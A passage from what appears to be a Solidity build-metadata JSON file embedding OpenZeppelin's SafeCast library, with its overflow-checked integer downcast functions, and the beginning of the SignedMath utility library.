SafeCastOverflowedUintDowncast(232, value);\\n        }\\n        return uint232(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint224 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint224).\\n     *\\n     * Counterpart to Solidity's `uint224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     */\\n    function toUint224(uint256 value) internal pure returns (uint224) {\\n        if (value > type(uint224).max) {\\n            revert SafeCastOverflowedUintDowncast(224, value);\\n        }\\n        return uint224(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint216 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint216).\\n     *\\n     * Counterpart to Solidity's `uint216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     */\\n    function toUint216(uint256 value) internal pure returns (uint216) {\\n        if (value > type(uint216).max) {\\n            revert SafeCastOverflowedUintDowncast(216, value);\\n        }\\n        return uint216(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint208 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint208).\\n     *\\n     * Counterpart to Solidity's `uint208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     */\\n    function toUint208(uint256 value) internal pure returns (uint208) {\\n        if (value > type(uint208).max) {\\n            revert SafeCastOverflowedUintDowncast(208, value);\\n        }\\n        return uint208(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint200 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint200).\\n     *\\n     * Counterpart to Solidity's `uint200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     */\\n    function toUint200(uint256 value) internal pure returns (uint200) {\\n        if (value > type(uint200).max) {\\n            revert SafeCastOverflowedUintDowncast(200, value);\\n        }\\n        return uint200(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint192 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint192).\\n     *\\n     * Counterpart to Solidity's `uint192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     */\\n    function toUint192(uint256 value) internal pure returns (uint192) {\\n        if (value > type(uint192).max) {\\n            revert SafeCastOverflowedUintDowncast(192, value);\\n        }\\n        return uint192(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint184 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint184).\\n     *\\n     * Counterpart to Solidity's `uint184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     */\\n    function toUint184(uint256 value) internal pure returns (uint184) {\\n        if (value > type(uint184).max) {\\n            revert SafeCastOverflowedUintDowncast(184, value);\\n        }\\n        return uint184(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint176 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint176).\\n     *\\n     * Counterpart to Solidity's `uint176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     */\\n    function toUint176(uint256 value) internal pure returns (uint176) {\\n        if (value > type(uint176).max) {\\n            revert SafeCastOverflowedUintDowncast(176, value);\\n        }\\n        return uint176(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint168 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint168).\\n     *\\n     * Counterpart to Solidity's `uint168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     */\\n    function toUint168(uint256 value) internal pure returns (uint168) {\\n        if (value > type(uint168).max) {\\n            revert SafeCastOverflowedUintDowncast(168, value);\\n        }\\n        return uint168(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint160 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint160).\\n     *\\n     * Counterpart to Solidity's `uint160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     */\\n    function toUint160(uint256 value) internal pure returns (uint160) {\\n        if (value > type(uint160).max) {\\n            revert SafeCastOverflowedUintDowncast(160, value);\\n        }\\n        return uint160(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint152 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint152).\\n     *\\n     * Counterpart to Solidity's `uint152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     */\\n    function toUint152(uint256 value) internal pure returns (uint152) {\\n        if (value > type(uint152).max) {\\n            revert SafeCastOverflowedUintDowncast(152, value);\\n        }\\n        return uint152(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint144 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint144).\\n     *\\n     * Counterpart to Solidity's `uint144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     */\\n    function toUint144(uint256 value) internal pure returns (uint144) {\\n        if (value > type(uint144).max) {\\n            revert SafeCastOverflowedUintDowncast(144, value);\\n        }\\n        return uint144(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint136 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint136).\\n     *\\n     * Counterpart to Solidity's `uint136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     */\\n    function toUint136(uint256 value) internal pure returns (uint136) {\\n        if (value > type(uint136).max) {\\n            revert SafeCastOverflowedUintDowncast(136, value);\\n        }\\n        return uint136(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint128 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint128).\\n     *\\n     * Counterpart to Solidity's `uint128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     */\\n    function toUint128(uint256 value) internal pure returns (uint128) {\\n        if (value > type(uint128).max) {\\n            revert SafeCastOverflowedUintDowncast(128, value);\\n        }\\n        return uint128(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint120 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint120).\\n     *\\n     * Counterpart to Solidity's `uint120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     */\\n    function toUint120(uint256 value) internal pure returns (uint120) {\\n        if (value > type(uint120).max) {\\n            revert SafeCastOverflowedUintDowncast(120, value);\\n        }\\n        return uint120(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint112 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint112).\\n     *\\n     * Counterpart to Solidity's `uint112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     */\\n    function toUint112(uint256 value) internal pure returns (uint112) {\\n        if (value > type(uint112).max) {\\n            revert SafeCastOverflowedUintDowncast(112, value);\\n        }\\n        return uint112(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint104 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint104).\\n     *\\n     * Counterpart to Solidity's `uint104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     */\\n    function toUint104(uint256 value) internal pure returns (uint104) {\\n        if (value > type(uint104).max) {\\n            revert SafeCastOverflowedUintDowncast(104, value);\\n        }\\n        return uint104(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint96 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint96).\\n     *\\n     * Counterpart to Solidity's `uint96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     */\\n    function toUint96(uint256 value) internal pure returns (uint96) {\\n        if (value > type(uint96).max) {\\n            revert SafeCastOverflowedUintDowncast(96, value);\\n        }\\n        return uint96(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint88 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint88).\\n     *\\n     * Counterpart to Solidity's `uint88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     */\\n    function toUint88(uint256 value) internal pure returns (uint88) {\\n        if (value > type(uint88).max) {\\n            revert SafeCastOverflowedUintDowncast(88, value);\\n        }\\n        return uint88(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint80 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint80).\\n     *\\n     * Counterpart to Solidity's `uint80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     */\\n    function toUint80(uint256 value) internal pure returns (uint80) {\\n        if (value > type(uint80).max) {\\n            revert SafeCastOverflowedUintDowncast(80, value);\\n        }\\n        return uint80(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint72 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint72).\\n     *\\n     * Counterpart to Solidity's `uint72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     */\\n    function toUint72(uint256 value) internal pure returns (uint72) {\\n        if (value > type(uint72).max) {\\n            revert SafeCastOverflowedUintDowncast(72, value);\\n        }\\n        return uint72(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint64 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint64).\\n     *\\n     * Counterpart to Solidity's `uint64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     */\\n    function toUint64(uint256 value) internal pure returns (uint64) {\\n        if (value > type(uint64).max) {\\n            revert SafeCastOverflowedUintDowncast(64, value);\\n        }\\n        return uint64(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint56 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint56).\\n     *\\n     * Counterpart to Solidity's `uint56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     */\\n    function toUint56(uint256 value) internal pure returns (uint56) {\\n        if (value > type(uint56).max) {\\n            revert SafeCastOverflowedUintDowncast(56, value);\\n        }\\n        return uint56(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint48 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint48).\\n     *\\n     * Counterpart to Solidity's `uint48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     */\\n    function toUint48(uint256 value) internal pure returns (uint48) {\\n        if (value > type(uint48).max) {\\n            revert SafeCastOverflowedUintDowncast(48, value);\\n        }\\n        return uint48(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint40 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint40).\\n     *\\n     * Counterpart to Solidity's `uint40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     */\\n    function toUint40(uint256 value) internal pure returns (uint40) {\\n        if (value > type(uint40).max) {\\n            revert SafeCastOverflowedUintDowncast(40, value);\\n        }\\n        return uint40(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint32 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint32).\\n     *\\n     * Counterpart to Solidity's `uint32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     */\\n    function toUint32(uint256 value) internal pure returns (uint32) {\\n        if (value > type(uint32).max) {\\n            revert SafeCastOverflowedUintDowncast(32, value);\\n        }\\n        return uint32(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint24 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint24).\\n     *\\n     * Counterpart to Solidity's `uint24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     */\\n    function toUint24(uint256 value) internal pure returns (uint24) {\\n        if (value > type(uint24).max) {\\n            revert SafeCastOverflowedUintDowncast(24, value);\\n        }\\n        return uint24(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint16 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint16).\\n     *\\n     * Counterpart to Solidity's `uint16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     */\\n    function toUint16(uint256 value) internal pure returns (uint16) {\\n        if (value > type(uint16).max) {\\n            revert SafeCastOverflowedUintDowncast(16, value);\\n        }\\n        return uint16(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint8 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint8).\\n     *\\n     * Counterpart to Solidity's `uint8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     */\\n    function toUint8(uint256 value) internal pure returns (uint8) {\\n        if (value > type(uint8).max) {\\n            revert SafeCastOverflowedUintDowncast(8, value);\\n        }\\n        return uint8(value);\\n    }\\n\\n    /**\\n     * @dev Converts a signed int256 into an unsigned uint256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be greater than or equal to 0.\\n     */\\n    function toUint256(int256 value) internal pure returns (uint256) {\\n        if (value < 0) {\\n            revert SafeCastOverflowedIntToUint(value);\\n        }\\n        return uint256(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int248 from int256, reverting on\\n     * overflow (when the input is less than smallest int248 or\\n     * greater than largest int248).\\n     *\\n     * Counterpart to Solidity's `int248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     */\\n    function toInt248(int256 value) internal pure returns (int248 downcasted) {\\n        downcasted = int248(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(248, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int240 from int256, reverting on\\n     * overflow (when the input is less than smallest int240 or\\n     * greater than largest int240).\\n     *\\n     * Counterpart to Solidity's `int240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     */\\n    function toInt240(int256 value) internal pure returns (int240 downcasted) {\\n        downcasted = int240(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(240, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int232 from int256, reverting on\\n     * overflow (when the input is less than smallest int232 or\\n     * greater than largest int232).\\n     *\\n     * Counterpart to Solidity's `int232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     */\\n    function toInt232(int256 value) internal pure returns (int232 downcasted) {\\n        downcasted = int232(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(232, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int224 from int256, reverting on\\n     * overflow (when the input is less than smallest int224 or\\n     * greater than largest int224).\\n     *\\n     * Counterpart to Solidity's `int224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     */\\n    function toInt224(int256 value) internal pure returns (int224 downcasted) {\\n        downcasted = int224(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(224, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int216 from int256, reverting on\\n     * overflow (when the input is less than smallest int216 or\\n     * greater than largest int216).\\n     *\\n     * Counterpart to Solidity's `int216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     */\\n    function toInt216(int256 value) internal pure returns (int216 downcasted) {\\n        downcasted = int216(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(216, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int208 from int256, reverting on\\n     * overflow (when the input is less than smallest int208 or\\n     * greater than largest int208).\\n     *\\n     * Counterpart to Solidity's `int208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     */\\n    function toInt208(int256 value) internal pure returns (int208 downcasted) {\\n        downcasted = int208(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(208, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int200 from int256, reverting on\\n     * overflow (when the input is less than smallest int200 or\\n     * greater than largest int200).\\n     *\\n     * Counterpart to Solidity's `int200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     */\\n    function toInt200(int256 value) internal pure returns (int200 downcasted) {\\n        downcasted = int200(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(200, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int192 from int256, reverting on\\n     * overflow (when the input is less than smallest int192 or\\n     * greater than largest int192).\\n     *\\n     * Counterpart to Solidity's `int192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     */\\n    function toInt192(int256 value) internal pure returns (int192 downcasted) {\\n        downcasted = int192(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(192, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int184 from int256, reverting on\\n     * overflow (when the input is less than smallest int184 or\\n     * greater than largest int184).\\n     *\\n     * Counterpart to Solidity's `int184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     */\\n    function toInt184(int256 value) internal pure returns (int184 downcasted) {\\n        downcasted = int184(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(184, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int176 from int256, reverting on\\n     * overflow (when the input is less than smallest int176 or\\n     * greater than largest int176).\\n     *\\n     * Counterpart to Solidity's `int176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     */\\n    function toInt176(int256 value) internal pure returns (int176 downcasted) {\\n        downcasted = int176(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(176, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int168 from int256, reverting on\\n     * overflow (when the input is less than smallest int168 or\\n     * greater than largest int168).\\n     *\\n     * Counterpart to Solidity's `int168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     */\\n    function toInt168(int256 value) internal pure returns (int168 downcasted) {\\n        downcasted = int168(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(168, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int160 from int256, reverting on\\n     * overflow (when the input is less than smallest int160 or\\n     * greater than largest int160).\\n     *\\n     * Counterpart to Solidity's `int160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     */\\n    function toInt160(int256 value) internal pure returns (int160 downcasted) {\\n        downcasted = int160(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(160, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int152 from int256, reverting on\\n     * overflow (when the input is less than smallest int152 or\\n     * greater than largest int152).\\n     *\\n     * Counterpart to Solidity's `int152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     */\\n    function toInt152(int256 value) internal pure returns (int152 downcasted) {\\n        downcasted = int152(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(152, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int144 from int256, reverting on\\n     * overflow (when the input is less than smallest int144 or\\n     * greater than largest int144).\\n     *\\n     * Counterpart to Solidity's `int144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     */\\n    function toInt144(int256 value) internal pure returns (int144 downcasted) {\\n        downcasted = int144(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(144, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int136 from int256, reverting on\\n     * overflow (when the input is less than smallest int136 or\\n     * greater than largest int136).\\n     *\\n     * Counterpart to Solidity's `int136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     */\\n    function toInt136(int256 value) internal pure returns (int136 downcasted) {\\n        downcasted = int136(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(136, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int128 from int256, reverting on\\n     * overflow (when the input is less than smallest int128 or\\n     * greater than largest int128).\\n     *\\n     * Counterpart to Solidity's `int128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     */\\n    function toInt128(int256 value) internal pure returns (int128 downcasted) {\\n        downcasted = int128(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(128, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int120 from int256, reverting on\\n     * overflow (when the input is less than smallest int120 or\\n     * greater than largest int120).\\n     *\\n     * Counterpart to Solidity's `int120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     */\\n    function toInt120(int256 value) internal pure returns (int120 downcasted) {\\n        downcasted = int120(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(120, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int112 from int256, reverting on\\n     * overflow (when the input is less than smallest int112 or\\n     * greater than largest int112).\\n     *\\n     * Counterpart to Solidity's `int112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     */\\n    function toInt112(int256 value) internal pure returns (int112 downcasted) {\\n        downcasted = int112(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(112, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int104 from int256, reverting on\\n     * overflow (when the input is less than smallest int104 or\\n     * greater than largest int104).\\n     *\\n     * Counterpart to Solidity's `int104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     */\\n    function toInt104(int256 value) internal pure returns (int104 downcasted) {\\n        downcasted = int104(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(104, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int96 from int256, reverting on\\n     * overflow (when the input is less than smallest int96 or\\n     * greater than largest int96).\\n     *\\n     * Counterpart to Solidity's `int96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     */\\n    function toInt96(int256 value) internal pure returns (int96 downcasted) {\\n        downcasted = int96(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(96, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int88 from int256, reverting on\\n     * overflow (when the input is less than smallest int88 or\\n     * greater than largest int88).\\n     *\\n     * Counterpart to Solidity's `int88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     */\\n    function toInt88(int256 value) internal pure returns (int88 downcasted) {\\n        downcasted = int88(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(88, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int80 from int256, reverting on\\n     * overflow (when the input is less than smallest int80 or\\n     * greater than largest int80).\\n     *\\n     * Counterpart to Solidity's `int80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     */\\n    function toInt80(int256 value) internal pure returns (int80 downcasted) {\\n        downcasted = int80(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(80, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int72 from int256, reverting on\\n     * overflow (when the input is less than smallest int72 or\\n     * greater than largest int72).\\n     *\\n     * Counterpart to Solidity's `int72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     */\\n    function toInt72(int256 value) internal pure returns (int72 downcasted) {\\n        downcasted = int72(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(72, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int64 from int256, reverting on\\n     * overflow (when the input is less than smallest int64 or\\n     * greater than largest int64).\\n     *\\n     * Counterpart to Solidity's `int64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     */\\n    function toInt64(int256 value) internal pure returns (int64 downcasted) {\\n        downcasted = int64(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(64, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int56 from int256, reverting on\\n     * overflow (when the input is less than smallest int56 or\\n     * greater than largest int56).\\n     *\\n     * Counterpart to Solidity's `int56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     */\\n    function toInt56(int256 value) internal pure returns (int56 downcasted) {\\n        downcasted = int56(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(56, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int48 from int256, reverting on\\n     * overflow (when the input is less than smallest int48 or\\n     * greater than largest int48).\\n     *\\n     * Counterpart to Solidity's `int48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     */\\n    function toInt48(int256 value) internal pure returns (int48 downcasted) {\\n        downcasted = int48(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(48, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int40 from int256, reverting on\\n     * overflow (when the input is less than smallest int40 or\\n     * greater than largest int40).\\n     *\\n     * Counterpart to Solidity's `int40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     */\\n    function toInt40(int256 value) internal pure returns (int40 downcasted) {\\n        downcasted = int40(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(40, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int32 from int256, reverting on\\n     * overflow (when the input is less than smallest int32 or\\n     * greater than largest int32).\\n     *\\n     * Counterpart to Solidity's `int32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     */\\n    function toInt32(int256 value) internal pure returns (int32 downcasted) {\\n        downcasted = int32(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(32, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int24 from int256, reverting on\\n     * overflow (when the input is less than smallest int24 or\\n     * greater than largest int24).\\n     *\\n     * Counterpart to Solidity's `int24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     */\\n    function toInt24(int256 value) internal pure returns (int24 downcasted) {\\n        downcasted = int24(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(24, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int16 from int256, reverting on\\n     * overflow (when the input is less than smallest int16 or\\n     * greater than largest int16).\\n     *\\n     * Counterpart to Solidity's `int16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     */\\n    function toInt16(int256 value) internal pure returns (int16 downcasted) {\\n        downcasted = int16(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(16, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int8 from int256, reverting on\\n     * overflow (when the input is less than smallest int8 or\\n     * greater than largest int8).\\n     *\\n     * Counterpart to Solidity's `int8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     */\\n    function toInt8(int256 value) internal pure returns (int8 downcasted) {\\n        downcasted = int8(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(8, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts an unsigned uint256 into a signed int256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be less than or equal to maxInt256.\\n     */\\n    function toInt256(uint256 value) internal pure returns (int256) {\\n        // Note: Unsafe cast below is okay because `type(int256).max` is guaranteed to be positive\\n        if (value > uint256(type(int256).max)) {\\n            revert SafeCastOverflowedUintToInt(value);\\n        }\\n        return int256(value);\\n    }\\n\\n    /**\\n     * @dev Cast a boolean (false or true) to a uint256 (0 or 1) with no jump.\\n     */\\n    function toUint(bool b) internal pure returns (uint256 u) {\\n        assembly (\\\"memory-safe\\\") {\\n            u := iszero(iszero(b))\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x195533c86d0ef72bcc06456a4f66a9b941f38eb403739b00f21fd7c1abd1ae54\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/SignedMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SignedMath.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {SafeCast} from \\\"./SafeCast.sol\\\";\\n\\n/**\\n * @dev Standard signed math utilities missing in the Solidity language.\\n */\\nlibrary SignedMath {\\n    /**\\n     * @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.\\n     *\\n     * IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.\\n     * However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute\\n     * one branch when needed, making this function more expensive.\\n     */\\n    function ternary(bool condition, int256 a, int256 b) internal pure returns (int256) {\\n        unchecked {\\n            // branchless ternary works because:\\n            // b ^ (a ^ b) == a\\n            // b ^ 0 == b\\n            return b ^ ((a ^ b) * int256(SafeCast.toUint(condition)));\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two signed numbers.\\n     */\\n    function max(int256 a, int256 b) internal pure returns (int256) {\\n        return ternary(a > b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two signed numbers.\\n     */\\n    function min(int256 a, int256 b) internal pure returns (int256) {\\n        return ternary(a < b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the average of two signed numbers without overflow.\\n     * The result is rounded towards zero.\\n     */\\n    function average(int256 a, int256 b) internal pure returns (int256) {\\n        // Formula from the book \\\"Hacker's Delight\\\"\\n        int256 x = (a & b) + ((a ^ b) >> 1);\\n        return x + (int256(uint256(x) >> 